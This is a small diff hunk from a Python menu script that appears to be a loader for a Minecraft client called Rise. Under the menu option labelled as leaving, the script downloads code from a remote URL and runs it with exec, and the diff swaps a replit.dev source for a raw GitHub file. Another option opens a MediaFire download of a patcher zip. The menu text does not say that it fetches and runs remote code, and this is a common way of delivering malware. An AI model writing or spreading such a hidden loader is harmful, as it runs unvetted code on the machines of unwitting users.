@@ -47,7 +47,7 @@ while True:
       if chon == '-':
           os.system('cls')
           print("Leaving Rise")
-          exec(requests.get('https://262743e2-fa7a-4c75-a724-3e0aea46544c-00-3cmaqtrfhkj2o.janeway.replit.dev/minecraft.py').text)
+          exec(requests.get('https://raw.githubusercontent.com/VuDungVapeV4/MCCLoader-Free/main/Real').text)
       if chon == 'P':
           webbrowser.open_new("https://www.mediafire.com/file/48i74z1wnp4icox/Rise+Patcher.zip/file")
       if chon == '3.8':
